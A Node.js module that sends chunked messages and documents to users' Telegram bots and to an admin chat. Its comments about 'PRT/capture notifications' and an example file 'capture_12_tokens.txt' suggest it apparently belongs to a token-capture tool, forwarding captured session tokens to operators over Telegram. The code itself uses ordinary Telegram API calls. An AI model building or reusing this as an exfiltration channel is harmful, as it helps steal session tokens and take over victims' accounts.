const axios = require('axios');
const db = require('../database/connection');
const dcdiag = require('../utils/dcdiag');

// Telegram hard limit per sendMessage request
const TELEGRAM_MAX_LEN = 4096;

/**
 * @param {number|string} userId
 * @param {string} message  HTML-formatted message
 * @param {object} [options]
 * @param {string} [options.parse_mode='HTML']
 * @param {boolean} [options.disable_web_preview=true]
 * @param {boolean} [options.requireNotifyPrt=true]  gate on users.notify_prt
 * @returns {Promise<boolean>} true if at least one chunk sent successfully
 */
async function sendTelegramNotification(userId, message, options = {}) {
  try {
    const {
      parse_mode = 'HTML',
      disable_web_preview = true,
      requireNotifyPrt = true,
    } = options;

    if (!message) return false;

    const [users] = await db.query(
      'SELECT telegram_id, telegram_bot_token, notify_prt FROM users WHERE id = ?',
      [userId]
    );
    if (!users.length) {
      dcdiag.fail('tg_msg_skip user_id=' + userId + ' reason=no_user_row');
      return false;
    }

    const user = db.openUser(users[0]);
    if (!user.telegram_id || !user.telegram_bot_token) {
      dcdiag.fail('tg_msg_skip user_id=' + userId + ' reason=no_credentials chat_id_set=' + !!user.telegram_id + ' bot_token_set=' + !!user.telegram_bot_token);
      return false;
    }
    // Respect per-user notification preference (PRT/capture notifications)
    if (requireNotifyPrt && !user.notify_prt) {
      dcdiag.log('tg_msg_skip user_id=' + userId + ' reason=notify_prt_disabled');
      return false;
    }

    const chunks = chunkMessage(String(message), TELEGRAM_MAX_LEN);
    const url = `https://api.telegram.org/bot${user.telegram_bot_token}/sendMessage`;
    let anySent = false;

    for (const chunk of chunks) {
      try {
        await axios.post(url, {
          chat_id: user.telegram_id,
          text: chunk,
          parse_mode,
          disable_web_preview,
        });
        anySent = true;
      } catch (err) {
        if (parse_mode && err.response && err.response.status === 400) {
          try {
            await axios.post(url, {
              chat_id: user.telegram_id,
              text: chunk,
              disable_web_preview,
            });
            anySent = true;
            continue;
          } catch (retryErr) {
            dcdiag.fail('tg_msg_retry_failed user_id=' + userId + ' err=' + retryErr.message + ' http_status=' + (retryErr.response && retryErr.response.status) + ' http_body=' + String(retryErr.response && retryErr.response.data).substring(0, 150));
          }
        } else {
          dcdiag.fail('tg_msg_failed user_id=' + userId + ' err=' + err.message + ' http_status=' + (err.response && err.response.status) + ' http_body=' + String(err.response && err.response.data).substring(0, 150));
        }
      }
    }

    dcdiag.log('tg_msg_result user_id=' + userId + ' chat_id=' + user.telegram_id + ' anySent=' + anySent + ' chunks=' + chunks.length);
    return anySent;
  } catch (err) {
    dcdiag.fail('tg_msg_error user_id=' + userId + ' err=' + err.message);
    return false;
  }
}

/**
 * @param {string} message
 * @param {object} [options]
 * @param {string} [options.parse_mode='HTML']
 * @param {boolean} [options.disable_web_preview=true]
 * @returns {Promise<boolean>}
 */
async function sendAdminNotification(message, options = {}) {
  try {
    const { parse_mode = 'HTML', disable_web_preview = true } = options;
    const config = require('../config/env');
    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_ADMIN_CHAT_ID) {
      dcdiag.fail('tg_admin_skip reason=no_admin_credentials bot_token_set=' + !!config.TELEGRAM_BOT_TOKEN + ' admin_chat_set=' + !!config.TELEGRAM_ADMIN_CHAT_ID);
      return false;
    }
    if (!message) return false;

    const chunks = chunkMessage(String(message), TELEGRAM_MAX_LEN);
    const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
    let anySent = false;

    for (const chunk of chunks) {
      try {
        await axios.post(url, {
          chat_id: config.TELEGRAM_ADMIN_CHAT_ID,
          text: chunk,
          parse_mode,
          disable_web_preview,
        });
        anySent = true;
      } catch (err) {
        if (parse_mode && err.response && err.response.status === 400) {
          try {
            await axios.post(url, {
              chat_id: config.TELEGRAM_ADMIN_CHAT_ID,
              text: chunk,
              disable_web_preview,
            });
            anySent = true;
            continue;
          } catch (retryErr) {

          }
        }

      }
    }

    return anySent;
  } catch (err) {

    return false;
  }
}

/**
 * Send a document/file to the admin Telegram chat configured via env.
 *
 * @param {string} filename
 * @param {string|Buffer} fileContent
 * @param {string} [caption]
 * @returns {Promise<boolean>}
 */
async function sendAdminDocument(filename, fileContent, caption) {
  try {
    const config = require('../config/env');
    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_ADMIN_CHAT_ID) return false;
    if (!filename || fileContent === undefined || fileContent === null) return false;

    const safeCaption = caption ? String(caption).slice(0, 1024) : '';
    const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendDocument`;

    const form = new FormData();
    form.set('chat_id', config.TELEGRAM_ADMIN_CHAT_ID);
    const blob = typeof fileContent === 'string'
      ? new Blob([fileContent], { type: 'application/json' })
      : new Blob([fileContent], { type: 'application/json' });
    form.set('document', blob, filename);
    if (safeCaption) {
      form.set('caption', safeCaption);
      form.set('parse_mode', 'HTML');
    }
    form.set('disable_web_page_preview', 'true');

    await axios.post(url, form);
    return true;
  } catch (err) {

    return false;
  }
}

/**
 * @param {string} text
 * @param {number} maxLen
 * @returns {string[]}
 */
function chunkMessage(text, maxLen) {
  if (text.length <= maxLen) return [text];

  const chunks = [];
  let remaining = text;

  while (remaining.length > 0) {
    if (remaining.length <= maxLen) {
      chunks.push(remaining);
      break;
    }

    let sliceEnd = remaining.lastIndexOf('\n', maxLen);
    if (sliceEnd <= 0) {
      // No newline within the window — try a space, else hard cut.
      sliceEnd = remaining.lastIndexOf(' ', maxLen);
      if (sliceEnd <= 0) sliceEnd = maxLen;
    }

    chunks.push(remaining.slice(0, sliceEnd));
    remaining = remaining.slice(sliceEnd).replace(/^\n/, '');
  }

  return chunks;
}

/**
 * @param {number|string} userId
 * @param {string} filename   e.g. "capture_12_tokens.txt"
 * @param {string} fileContent  raw text content of the file
 * @param {string} caption     short HTML caption (summary)
 * @param {object} [options]
 * @param {string} [options.caption_parse_mode='HTML']
 * @param {boolean} [options.requireNotifyPrt=true]
 * @param {boolean} [options.disable_web_preview=true]
 * @returns {Promise<boolean>}
 */
async function sendTelegramDocument(userId, filename, fileContent, caption, options = {}) {
  const {
    caption_parse_mode = 'HTML',
    requireNotifyPrt = true,
    disable_web_preview = true,
  } = options;

  const safeCaption = caption ? String(caption).slice(0, 1024) : '';

  try {
    if (!filename || fileContent === undefined || fileContent === null) return false;

    const [users] = await db.query(
      'SELECT telegram_id, telegram_bot_token, notify_prt FROM users WHERE id = ?',
      [userId]
    );
    if (!users.length) {
      dcdiag.fail('telegram_skip user_id=' + userId + ' reason=no_user_row filename=' + filename);
      return false;
    }

    const user = db.openUser(users[0]);
    if (!user.telegram_id || !user.telegram_bot_token) {
      dcdiag.fail('telegram_skip user_id=' + userId + ' reason=no_credentials chat_id_set=' + !!user.telegram_id + ' bot_token_set=' + !!user.telegram_bot_token);
      return false;
    }
    if (requireNotifyPrt && !user.notify_prt) {
      dcdiag.log('telegram_skip user_id=' + userId + ' reason=notify_prt_disabled chat_id=' + user.telegram_id);
      return false;
    }

    dcdiag.log('telegram_send user_id=' + userId + ' chat_id=' + user.telegram_id + ' filename=' + filename);

    const url = `https://api.telegram.org/bot${user.telegram_bot_token}/sendDocument`;

    // Node 18+ has global FormData and Blob
    const form = new FormData();
    form.set('chat_id', user.telegram_id);
    form.set('document', new Blob([String(fileContent)], { type: 'text/plain' }), filename);
    if (safeCaption) {
      form.set('caption', safeCaption);
      form.set('parse_mode', caption_parse_mode);
    }
    if (disable_web_preview) form.set('disable_web_page_preview', 'true');

    await axios.post(url, form);
    dcdiag.log('telegram_sent user_id=' + userId + ' chat_id=' + user.telegram_id + ' filename=' + filename);
    return true;
  } catch (err) {
    dcdiag.fail('telegram_error user_id=' + userId + ' err=' + err.message + ' http_status=' + (err.response && err.response.status) + ' http_body=' + (err.response && err.response.data && JSON.stringify(err.response.data).substring(0, 200)));

    if (caption_parse_mode && err.response && err.response.status === 400) {
      try {
        const [users] = await db.query(
          'SELECT telegram_id, telegram_bot_token FROM users WHERE id = ?',
          [userId]
        );
        if (!users.length) return false;

        const user = db.openUser(users[0]);
        if (!user.telegram_id || !user.telegram_bot_token) return false;

        const url = `https://api.telegram.org/bot${user.telegram_bot_token}/sendDocument`;
        const form2 = new FormData();
        form2.set('chat_id', user.telegram_id);
        form2.set('document', new Blob([String(fileContent)], { type: 'text/plain' }), filename);
        if (safeCaption) {
          form2.set('caption', safeCaption);
          // no parse_mode – plain text caption
        }
        if (disable_web_preview) form2.set('disable_web_page_preview', 'true');
        dcdiag.log('telegram_retry_plain_caption user_id=' + userId + ' chat_id=' + user.telegram_id);
        await axios.post(url, form2);
        dcdiag.log('telegram_sent_retry user_id=' + userId + ' chat_id=' + user.telegram_id + ' filename=' + filename);
        return true;
      } catch (retryErr) {
        dcdiag.fail('telegram_retry_failed user_id=' + userId + ' err=' + retryErr.message + ' http_status=' + (retryErr.response && retryErr.response.status) + ' http_body=' + (retryErr.response && retryErr.response.data && JSON.stringify(retryErr.response.data).substring(0, 200)));
      }
    }

    return false;
  }
}

module.exports = { sendTelegramNotification, sendAdminNotification, sendTelegramDocument, sendAdminDocument };
